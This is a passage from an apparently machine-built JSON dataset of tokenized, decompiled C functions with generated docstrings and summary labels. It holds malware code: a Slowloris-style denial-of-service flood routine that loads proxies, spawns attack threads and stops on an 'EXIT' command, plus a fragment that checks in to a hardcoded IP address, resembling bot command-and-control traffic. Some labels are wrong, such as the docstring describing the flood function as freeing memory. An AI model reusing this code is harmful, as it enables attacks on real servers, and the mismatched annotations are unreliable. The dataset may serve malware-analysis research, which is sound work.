            "strcpy",
            "(",
            "cp",
            ",",
            "\"37.221.170.5\"",
            ")",
            ";",
            "v1",
            "=",
            "getpid",
            "(",
            ")",
            ";",
            "snprintf",
            "(",
            "s",
            ",",
            "0x3FFuL",
            "L",
            ",",
            "\"GET /~dqyefldi/response.php?auth=tru&id=%d&pro=%d HTTP/1.1\\r\\n\"",
            "\"Host: %s\\r\\n\"",
            "\"Connection: close\\r\\n\"",
            "\"Cache-Control: no-cache\\r\\n\"",
            "\"",
            "Origin",
            ":",
            "http",
            ":",
            "\"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536\"",
            "\".5\\r\\n\"",
            "\"Content-Type: application/x-www-form-urlencoded\\r\\n\"",
            "\"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\"",
            "\"Accept-Language: en-GB,en-US;q=0.8,en;q=0.6\\r\\n\"",
            "\"Accept-charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\\r\\n\"",
            "\"\\r\\n\"",
            ",",
            "a1",
            ",",
            "v1",
            ",",
            "cp",
            ")",
            ";",
            "fd",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "1",
            ",",
            "6",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "<",
            "0",
            ")",
            "{",
            "perror",
            "(",
            "\"Can't create TCP socket\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "addr",
            "=",
            "(",
            "struct",
            "sockaddr",
            "*",
            ")",
            "malloc",
            "(",
            "8uL",
            "L",
            ")",
            ";",
            "addr",
            "-",
            ">",
            "sa_family",
            "=",
            "2",
            ";",
            "v6",
            "=",
            "inet_pton",
            "(",
            "2",
            ",",
            "cp",
            ",",
            "&",
            "addr",
            "-",
            ">",
            "sa_data",
            "[",
            "2",
            "]",
            ")",
            ";",
            "if",
            "(",
            "v6",
            "<",
            "0",
            ")",
            "{",
            "perror",
            "(",
            "\"Can't set remote->sin_addr.s_addr\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "v6",
            ")",
            "{",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"%s is not a valid IP address\\n\"",
            ",",
            "cp",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "addr",
            "-",
            ">",
            "sa_data",
            "=",
            "htons",
            "(",
            "0x50u",
            ")",
            ";",
            "if",
            "(",
            "connect",
            "(",
            "fd",
            ",",
            "addr",
            ",",
            "0x10u",
            ")",
            "<",
            "0",
            ")",
            "{",
            "perror",
            "(",
            "\"Could not connect\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "v2",
            "=",
            "strlen",
            "(",
            "s",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "send",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "v2",
            ",",
            "0",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"Can't send query\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            ";",
            "i",
            "+",
            "=",
            "v7",
            ")",
            "{",
            "v7",
            "=",
            "recv",
            "(",
            "fd",
            ",",
            "&",
            "cp",
            "[",
            "i",
            "+",
            "13",
            "]",
            ",",
            "1024L",
            "L",
            "-",
            "i",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "v7",
            "<",
            "=",
            "0",
            ")",
            "break",
            ";",
            "}",
            "cp",
            "[",
            "i",
            "+",
            "13",
            "]",
            "=",
            "0",
            ";",
            "free",
            "(",
            "addr",
            ")",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `getpid` is being declared multiple times with conflicting prototypes across different code snippets, likely leading to compilation errors; it's intended to return the process ID of the calling process.",
            "The `printf` function, as indicated by the code snippets provided, is a function used for formatted output in C programming, allowing for the printing of messages, variables, and formatted text to the standard output."
        ],
        "longer_label": "The provided code is a C function that establishes a TCP connection to a remote server, sends a HTTP GET request with certain parameters, receives a response, and then closes the connection, with some potential issues noted such as conflicting declarations of `getpid` and an incorrect usage of `printf` in the annotations."
    },
    {
        "id": 396,
        "docstring_tokens": [
            "The",
            "code",
            "is",
            "attempting",
            "to",
            "free",
            "memory",
            "allocated",
            "for",
            "elements",
            "in",
            "an",
            "array",
            "named",
            "``",
            "returnparts",
            "''",
            "from",
            "index",
            "0",
            "to",
            "8",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "flood_slow_loris",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "signed",
            "int",
            "a2",
            ",",
            "char",
            "*",
            "a3",
            ",",
            "int",
            "a4",
            ")",
            "{",
            "_QWORD",
            "*",
            "v4",
            ";",
            "void",
            "*",
            "*",
            "v5",
            ";",
            "_QWORD",
            "*",
            "v6",
            ";",
            "size_t",
            "v7",
            ";",
            "__int64",
            "v8",
            ";",
            "__int64",
            "v9",
            ";",
            "size_t",
            "v10",
            ";",
            "void",
            "*",
            "*",
            "v11",
            ";",
            "void",
            "*",
            "*",
            "v12",
            ";",
            "_QWORD",
            "*",
            "v13",
            ";",
            "size_t",
            "v14",
            ";",
            "_QWORD",
            "*",
            "v15",
            ";",
            "_DWORD",
            "*",
            "v16",
            ";",
            "size_t",
            "v17",
            ";",
            "void",
            "*",
            "*",
            "v18",
            ";",
            "int",
            "*",
            "*",
            "h_addr_list",
            ";",
            "unsigned",
            "__int64",
            "v20",
            ";",
            "void",
            "*",
            "v21",
            ";",
            "unsigned",
            "__int64",
            "v22",
            ";",
            "void",
            "*",
            "v23",
            ";",
            "__int64",
            "v24",
            "[",
            "5",
            "]",
            ";",
            "char",
            "*",
            "filename",
            ";",
            "int",
            "fd",
            ";",
            "signed",
            "int",
            "v27",
            ";",
            "const",
            "char",
            "*",
            "v28",
            ";",
            "int",
            "cp",
            ";",
            "int",
            "i",
            ";",
            "unsigned",
            "int",
            "v31",
            ";",
            "__int64",
            "v32",
            ";",
            "char",
            "*",
            "s",
            ";",
            "FILE",
            "*",
            "stream",
            ";",
            "size_t",
            "size",
            ";",
            "void",
            "*",
            "ptr",
            ";",
            "void",
            "*",
            "*",
            "v37",
            ";",
            "rlim_t",
            "v38",
            ";",
            "struct",
            "hostent",
            "*",
            "v39",
            ";",
            "__int64",
            "v40",
            ";",
            "__int64",
            "*",
            "v41",
            ";",
            "__int64",
            "v42",
            ";",
            "__int64",
            "*",
            "v43",
            ";",
            "struct",
            "rlimit",
            "rlimits",
            ";",
            "char",
            "buf",
            "[",
            "7",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v46",
            ";",
            "v28",
            "=",
            "a1",
            ";",
            "v27",
            "=",
            "a2",
            ";",
            "filename",
            "=",
            "a3",
            ";",
            "fd",
            "=",
            "a4",
            ";",
            "v46",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "!",
            "a3",
            ")",
            "filename",
            "=",
            "\"proxies.txt\"",
            ";",
            "stream",
            "=",
            "fopen",
            "(",
            "filename",
            ",",
            "\"rb\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "stream",
            ")",
            "{",
            "fwrite",
            "(",
            "\"Invalid Proxy File Exiting...\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x1EuL",
            "L",
            ",",
            "stdout",
            ")",
            ";",
            "perror",
            "(",
            "\"fopen\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "fseek",
            "(",
            "stream",
            ",",
            "0L",
            "L",
            ",",
            "2",
            ")",
            ";",
            "size",
            "=",
            "ftell",
            "(",
            "stream",
            ")",
            ";",
            "rewind",
            "(",
            "stream",
            ")",
            ";",
            "ptr",
            "=",
            "malloc",
            "(",
            "size",
            ")",
            ";",
            "fread",
            "(",
            "ptr",
            ",",
            "1uL",
            "L",
            ",",
            "size",
            ",",
            "stream",
            ")",
            ";",
            "fclose",
            "(",
            "stream",
            ")",
            ";",
            "i",
            "=",
            "0",
            ";",
            "s",
            "=",
            "strtok",
            "(",
            "(",
            "char",
            "*",
            ")",
            "ptr",
            ",",
            "\":\"",
            ")",
            ";",
            "while",
            "(",
            "s",
            ")",
            "{",
            "if",
            "(",
            "head",
            ")",
            "{",
            "v12",
            "=",
            "(",
            "void",
            "*",
            "*",
            ")",
            "malloc",
            "(",
            "0x20uL",
            "L",
            ")",
            ";",
            "v37",
            "=",
            "v12",
            ";",
            "*",
            "v12",
            "=",
            "0L",
            "L",
            ";",
            "v12",
            "[",
            "1",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "v12",
            "[",
            "2",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "v12",
            "[",
            "3",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "v37",
            "=",
            "malloc",
            "(",
            "0x18uL",
            "L",
            ")",
            ";",
            "v13",
            "=",
            "*",
            "v37",
            ";",
            "*",
            "v13",
            "=",
            "0L",
            "L",
            ";",
            "v13",
            "[",
            "1",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "v13",
            "[",
            "2",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "*",
            "v37",
            "+",
            "5",
            ")",
            "=",
            "1",
            ";",
            "v14",
            "=",
            "strlen",
            "(",
            "s",
            ")",
            ";",
            "v15",
            "=",
            "*",
            "v37",
            ";",
            "v15",
            "[",
            "1",
            "]",
            "=",
            "malloc",
            "(",
            "v14",
            "+",
            "1",
            ")",
            ";",
            "strcpy",
            "(",
            "*",
            "(",
            "(",
            "char",
            "*",
            "*",
            ")",
            "*",
            "v37",
            "+",
            "1",
            ")",
            ",",
            "s",
            ")",
            ";",
            "s",
            "=",
            "strtok",
            "(",
            "0L",
            "L",
            ",",
            "\":\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "s",
            ")",
            "break",
            ";",
            "v16",
            "=",
            "*",
            "v37",
            ";",
            "v16",
            "[",
            "4",
            "]",
            "=",
            "atoi",
            "(",
            "s",
            ")",
            ";",
            "s",
            "=",
            "strtok",
            "(",
            "0L",
            "L",
            ",",
            "\":\"",
            ")",
            ";",
            "v17",
            "=",
            "strlen",
            "(",
            "s",
            ")",
            ";",
            "v18",
            "=",
            "(",
            "void",
            "*",
            "*",
            ")",
            "*",
            "v37",
            ";",
            "*",
            "v18",
            "=",
            "malloc",
            "(",
            "v17",
            "+",
            "1",
            ")",
            ";",
            "strcpy",
            "(",
            "*",
            "(",
            "char",
            "*",
            "*",
            ")",
            "*",
            "v37",
            ",",
            "s",
            ")",
            ";",
            "s",
            "=",
            "strtok",
            "(",
            "0L",
            "L",
            ",",
            "\":\"",
            ")",
            ";",
            "v37",
            "[",
            "1",
            "]",
            "=",
            "useragents",
            "[",
            "rand",
            "(",
            ")",
            "%",
            "0x30uL",
            "L",
            "]",
            ";",
            "v37",
            "[",
            "3",
            "]",
            "=",
            "(",
            "void",
            "*",
            ")",
            "head",
            ";",
            "v37",
            "[",
            "2",
            "]",
            "=",
            "*",
            "(",
            "void",
            "*",
            "*",
            ")",
            "(",
            "head",
            "+",
            "16",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "head",
            "+",
            "16",
            ")",
            "=",
            "v37",
            ";",
            "}",
            "else",
            "{",
            "head",
            "=",
            "(",
            "__int64",
            ")",
            "malloc",
            "(",
            "0x20uL",
            "L",
            ")",
            ";",
            "v4",
            "=",
            "(",
            "_QWORD",
            "*",
            ")",
            "head",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "head",
            "=",
            "0L",
            "L",
            ";",
            "v4",
            "[",
            "1",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "v4",
            "[",
            "2",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "v4",
            "[",
            "3",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "v5",
            "=",
            "(",
            "void",
            "*",
            "*",
            ")",
            "head",
            ";",
            "*",
            "v5",
            "=",
            "malloc",
            "(",
            "0x18uL",
            "L",
            ")",
            ";",
            "v6",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            "*",
            ")",
            "head",
            ";",
            "*",
            "v6",
            "=",
            "0L",
            "L",
            ";",
            "v6",
            "[",
            "1",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "v6",
            "[",
            "2",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "head",
            "+",
            "20L",
            "L",
            ")",
            "=",
            "1",
            ";",
            "v7",
            "=",
            "strlen",
            "(",
            "s",
            ")",
            ";",
            "v8",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "head",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v8",
            "+",
            "8",
            ")",
            "=",
            "malloc",
            "(",
            "v7",
            "+",
            "1",
            ")",
            ";",
            "strcpy",
            "(",
            "*",
            "(",
            "char",
            "*",
            "*",
            ")",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "head",
            "+",
            "8L",
            "L",
            ")",
            ",",
            "s",
            ")",
            ";",
            "s",
            "=",
            "strtok",
            "(",
            "0L",
            "L",
            ",",
            "\":\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "s",
            ")",
            "exit",
            "(",
            "-",
            "1",
            ")",
            ";",
            "v9",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "head",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v9",
            "+",
            "16",
            ")",
            "=",
            "atoi",
            "(",
            "s",
            ")",
            ";",
            "s",
            "=",
            "strtok",
            "(",
            "0L",
            "L",
            ",",
            "\":\"",
            ")",
            ";",
            "v10",
            "=",
            "strlen",
            "(",
            "s",
            ")",
            ";",
            "v11",
            "=",
            "*",
            "(",
            "void",
            "*",
            "*",
            "*",
            ")",
            "head",
            ";",
            "*",
            "v11",
            "=",
            "malloc",
            "(",
            "v10",
            "+",
            "1",
            ")",
            ";",
            "strcpy",
            "(",
            "*",
            "*",
            "(",
            "char",
            "*",
            "*",
            "*",
            ")",
            "head",
            ",",
            "s",
            ")",
            ";",
            "s",
            "=",
            "strtok",
            "(",
            "0L",
            "L",
            ",",
            "\":\"",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "head",
            "+",
            "8",
            ")",
            "=",
            "useragents",
            "[",
            "rand",
            "(",
            ")",
            "%",
            "0x30uL",
            "L",
            "]",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "head",
            "+",
            "16",
            ")",
            "=",
            "head",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "head",
            "+",
            "24",
            ")",
            "=",
            "head",
            ";",
            "}",
            "}",
            "free",
            "(",
            "ptr",
            ")",
            ";",
            "v38",
            "=",
            "2",
            "*",
            "(",
            "v27",
            "+",
            "512",
            ")",
            ";",
            "rlimits",
            ".",
            "rlim_cur",
            "=",
            "v38",
            ";",
            "rlimits",
            ".",
            "rlim_max",
            "=",
            "v38",
            ";",
            "fwrite",
            "(",
            "\"Starting Flood...\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x12uL",
            "L",
            ",",
            "stdout",
            ")",
            ";",
            "v31",
            "=",
            "setrlimit",
            "(",
            "RLIMIT_NOFILE",
            ",",
            "&",
            "rlimits",
            ")",
            ";",
            "if",
            "(",
            "v31",
            ")",
            "{",
            "perror",
            "(",
            "\"setrlimit\"",
            ")",
            ";",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"setrlimit returned result = %d\\n\"",
            ",",
            "v31",
            ")",
            ";",
            "}",
            "setupparts",
            "(",
            ")",
            ";",
            "parseURL",
            "(",
            "v28",
            ",",
            "&",
            "returnparts",
            ")",
            ";",
            "v39",
            "=",
            "gethostbyname",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "qword_F938",
            "+",
            "12",
            ")",
            ")",
            ";",
            "if",
            "(",
            "v39",
            ")",
            "{",
            "if",
            "(",
            "*",
            "v39",
            "-",
            ">",
            "h_addr_list",
            ")",
            "{",
            "h_addr_list",
            "=",
            "(",
            "int",
            "*",
            "*",
            ")",
            "v39",
            "-",
            ">",
            "h_addr_list",
            ";",
            "v39",
            "-",
            ">",
            "h_addr_list",
            "=",
            "(",
            "char",
            "*",
            "*",
            ")",
            "(",
            "h_addr_list",
            "+",
            "1",
            ")",
            ";",
            "cp",
            "=",
            "*",
            "*",
            "h_addr_list",
            ";",
            "ipstr",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "0x11uL",
            "L",
            ")",
            ";",
            "inet_ntop",
            "(",
            "2",
            ",",
            "&",
            "cp",
            ",",
            "ipstr",
            ",",
            "0x10u",
            ")",
            ";",
            "}",
            "}",
            "else",
            "{",
            "herror",
            "(",
            "\"gethostbyname\"",
            ")",
            ";",
            "}",
            "v40",
            "=",
            "v27",
            "-",
            "1L",
            "L",
            ";",
            "v24",
            "[",
            "2",
            "]",
            "=",
            "v27",
            ";",
            "v24",
            "[",
            "3",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "v24",
            "[",
            "0",
            "]",
            "=",
            "v27",
            ";",
            "v24",
            "[",
            "1",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "v20",
            "=",
            "16",
            "*",
            "(",
            "(",
            "8L",
            "L",
            "*",
            "v27",
            "+",
            "15",
            ")",
            "/",
            "0x10uL",
            "L",
            ")",
            ";",
            "while",
            "(",
            "v24",
            "!",
            "=",
            "(",
            "__int64",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "v24",
            "-",
            "(",
            "v20",
            "&",
            "0xFFFFFFFFFFFFF000L",
            "L",
            ")",
            ")",
            ")",
            ";",
            "v21",
            "=",
            "alloca",
            "(",
            "v20",
            "&",
            "0xFFF",
            ")",
            ";",
            "if",
            "(",
            "(",
            "v20",
            "&",
            "0xFFF",
            ")",
            "!",
            "=",
            "0",
            ")",
            "*",
            "(",
            "__int64",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "v24",
            "[",
            "-",
            "1",
            "]",
            "+",
            "(",
            "v20",
            "&",
            "0xFFF",
            ")",
            ")",
            "=",
            "*",
            "(",
            "__int64",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "v24",
            "[",
            "-",
            "1",
            "]",
            "+",
            "(",
            "v20",
            "&",
            "0xFFF",
            ")",
            ")",
            ";",
            "v41",
            "=",
            "v24",
            ";",
            "v42",
            "=",
            "v27",
            "-",
            "1L",
            "L",
            ";",
            "v22",
            "=",
            "16",
            "*",
            "(",
            "(",
            "8L",
            "L",
            "*",
            "v27",
            "+",
            "15",
            ")",
            "/",
            "0x10uL",
            "L",
            ")",
            ";",
            "while",
            "(",
            "v24",
            "!",
            "=",
            "(",
            "__int64",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "v24",
            "-",
            "(",
            "v22",
            "&",
            "0xFFFFFFFFFFFFF000L",
            "L",
            ")",
            ")",
            ")",
            ";",
            "v23",
            "=",
            "alloca",
            "(",
            "v22",
            "&",
            "0xFFF",
            ")",
            ";",
            "if",
            "(",
            "(",
            "v22",
            "&",
            "0xFFF",
            ")",
            "!",
            "=",
            "0",
            ")",
            "*",
            "(",
            "__int64",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "v24",
            "[",
            "-",
            "1",
            "]",
            "+",
            "(",
            "v22",
            "&",
            "0xFFF",
            ")",
            ")",
            "=",
            "*",
            "(",
            "__int64",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "v24",
            "[",
            "-",
            "1",
            "]",
            "+",
            "(",
            "v22",
            "&",
            "0xFFF",
            ")",
            ")",
            ";",
            "v43",
            "=",
            "v24",
            ";",
            "v32",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "head",
            "+",
            "16",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "v27",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "v43",
            "[",
            "i",
            "]",
            "=",
            "v32",
            ";",
            "v32",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v32",
            "+",
            "16",
            ")",
            ";",
            "}",
            "postpayload",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "0x1000uL",
            "L",
            ")",
            ";",
            "sprintf",
            "(",
            "postpayload",
            ",",
            "postformat",
            ",",
            "qword_F948",
            "+",
            "12",
            ",",
            "qword_F938",
            "+",
            "12",
            ")",
            ";",
            "freeparts",
            "(",
            ")",
            ";",
            "fnAttackInformation",
            "(",
            "v27",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "v27",
            ";",
            "+",
            "+",
            "i",
            ")",
            "pthread_create",
            "(",
            "(",
            "pthread_t",
            "*",
            ")",
            "&",
            "v41",
            "[",
            "i",
            "]",
            ",",
            "0L",
            "L",
            ",",
            "flood_SL",
            ",",
            "(",
            "void",
            "*",
            ")",
            "v43",
            "[",
            "i",
            "]",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "read",
            "(",
            "fd",
            ",",
            "buf",
            ",",
            "7uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "strncmp",
            "(",
            "buf",
            ",",
            "\"EXIT\"",
            ",",
            "4uL",
            "L",
            ")",
            ")",
            "break",
            ";",
            "sleep",
            "(",
            "2u",
            ")",
            ";",
            "}",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "STOP_FLAG_SL",
            "=",
            "1",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "v27",
            ";",
            "+",
            "+",
            "i",
            ")",
            "pthread_join",
            "(",
            "v41",
            "[",
            "i",
            "]",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "fwrite",
            "(",
            "\"All Threads joined\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x13uL",
            "L",
            ",",
            "stdout",
            ")",
            ";",
            "_exit",
            "(",
            "0",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code appears to be a C function for executing a Slowloris-style distributed denial-of-service (DDoS) attack, parsing proxies from a file, setting up connections, and launching multiple threads to flood a target server with HTTP requests."
    },
    {
        "id": 397,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "and",
            "sets",
            "up",
            "multiple",
            "struct",
            "urlparts",
            "with",
            "specific",
            "names",
            "and",
            "separators",
            "."
        ],
        "code_tokens": [
            "char",
            "*",
            "FUN0",
            "(",
            ")",
            "{",
            "__int64",
            "v0",
            ";",
            "__int64",
            "v1",
            ";",
            "__int64",
            "v2",
            ";",
            "__int64",
            "v3",
            ";",
            "__int64",
            "v4",
            ";",
            "__int64",
            "v5",
            ";",
            "__int64",
            "v6",
            ";",
            "__int64",
            "v7",
            ";",
            "char",
            "*",
            "v8",
            ";",
            "__int64",
            "v9",
            ";",
            "char",
            "*",
            "result",
            ";",
            "returnparts",
            "=",
            "(",
            "__int64",
            ")",
            "malloc",
            "(",
            "0x90uL",
            "L",
            ")",
            ";",
            "qword_F928",
            "=",
            "(",
            "__int64",
            ")",
            "malloc",
            "(",
            "0x90uL",
            "L",
            ")",
            ";",
            "qword_F930",
            "=",
            "(",
            "__int64",
            ")",
            "malloc",
            "(",
            "0x90uL",
            "L",
            ")",
            ";",
            "qword_F938",
            "=",
            "(",
            "__int64",
            ")",
            "malloc",
            "(",
            "0x90uL",
            "L",
            ")",
            ";",
            "qword_F940",
            "=",
            "(",
            "__int64",
            ")",
            "malloc",
            "(",
            "0x90uL",
            "L",
            ")",
            ";",
            "qword_F948",
            "=",
            "(",
            "__int64",
            ")",
            "malloc",
            "(",
            "0x90uL",
            "L",
            ")",
            ";",
            "qword_F950",
            "=",
            "(",
            "__int64",
            ")",
            "malloc",
            "(",
            "0x90uL",
            "L",
            ")",
            ";",
            "qword_F958",
            "=",
            "(",
            "__int64",
            ")",
            "malloc",
            "(",
            "0x90uL",
            "L",
            ")",
            ";",
            "ipstr",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "0x90uL",
            "L",
            ")",
            ";",
            "v0",
            "=",
            "returnparts",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "returnparts",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "136",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "v0",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v0",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v0",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
            "144",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "v1",
            "=",
            "qword_F928",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "qword_F928",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "136",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "v1",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v1",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v1",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
            "144",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "v2",
            "=",
            "qword_F930",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "qword_F930",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "136",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "v2",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v2",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v2",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
            "144",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "v3",
            "=",
            "qword_F938",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "qword_F938",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "136",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "v3",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v3",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v3",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
            "144",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "v4",
            "=",
            "qword_F940",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "qword_F940",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "136",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "v4",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v4",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v4",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
